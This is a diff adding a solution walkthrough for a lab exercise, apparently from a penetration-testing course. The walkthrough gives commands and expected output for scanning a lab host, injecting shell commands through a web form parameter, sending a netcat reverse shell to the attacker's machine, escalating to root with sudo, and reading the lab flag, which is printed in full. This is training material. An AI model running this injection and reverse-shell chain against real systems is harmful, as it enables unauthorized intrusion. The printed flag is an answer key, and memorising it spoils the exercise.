@@ -233,9 +233,81 @@ Lab 1 - Follow the steps above and exploit the command injection vulnerability o
 
 Lab 2 - For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit the command injection vulnerability like we did in this section, but this time use Linux specific commands to obtain a reverse shell. As soon as you have a reverse shell use the sudo su command to gain elevated privileges. Once you gain elevated privileges, find the flag located in the /opt/config.txt file.
 >``` shell
+># Start a Netcat listener on port 4444 to catch the reverse shell connection
+>nc -lvnp 4444
 >
+># ========== Expected Result ==========
+>listening on [any] 4444 ...
+># =====================================
+>
+># Scan all TCP ports on the target to identify which ports are open (Target: 192.168.110.16)
+>nmap -p- 192.168.110.16
+>
+># ========== Expected Result ==========
+>Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 07:13 CST
+>Nmap scan report for 192.168.110.16
+>Host is up (0.038s latency).
+>Not shown: 65533 closed tcp ports (reset)
+>PORT   STATE SERVICE
+>22/tcp open  ssh
+>80/tcp open  http
+>
+>Nmap done: 1 IP address (1 host up) scanned in 13.76 seconds
+># =====================================
+>
+># Verify command injection by appending ';whoami' to the Archive parameter (URL encoded)
+>curl -X POST --data 'Archive=git%3Bwhoami' http://192.168.110.16:80/archive
+>
+># ========== Expected Result ==========
+>...
+>'git help -a' and 'git help -g' list available subcommands and some
+>concept guides. See 'git help <command>' or 'git help <concept>'
+>to read about a specific subcommand or concept.
+>stanley
+># =====================================
+>
+># Check if 'nc' (netcat) is installed on the target system, which is required for reverse shell
+>curl -X POST --data 'Archive=git%3Bwhich%20nc' http://192.168.110.16:80/archive
+>
+># ========== Expected Result ==========
+>...
+>'git help -a' and 'git help -g' list available subcommands and some
+>concept guides. See 'git help <command>' or 'git help <concept>'
+>to read about a specific subcommand or concept.
+>/bin/nc
+># =====================================
+>
+># Execute a reverse shell payload:
+># - Remove any existing named pipe (/tmp/f)
+># - Create a named pipe at /tmp/f
+># - Use the pipe to send a shell to the attacker using Netcat
+># - Connects back to the attacker's machine on port 4444 (Kali IP: 192.168.45.203)
+>curl -X POST --data 'Archive=git%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.45.203%204444%20%3E%2Ftmp%2Ff' http://192.168.110.16:80/archive
+>
+># ========== Expected Result ==========
+>connect to [192.168.45.203] from (UNKNOWN) [192.168.110.16] 54158
+>/bin/sh: 0: can't access tty; job control turned off
+>$
+># =====================================
+>
+># Elevate privileges to root if the user has sudo access without a password
+>sudo su
+>
+># Confirm current user identity (should return 'root' after successful privilege escalation)
+>whoami
+>
+># ========== Expected Result ==========
+>root
+># =====================================
+>
+># Read and display the flag located in /opt/config.txt
+>cat /opt/config.txt
+>
+># ========== Expected Result ==========
+>OS{9396614b03580818904838e5f08c3137}
+># =====================================
 >```
->
+>OS{9396614b03580818904838e5f08c3137}
 
 Lab 3 - Capstone Lab: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.
 >``` shell
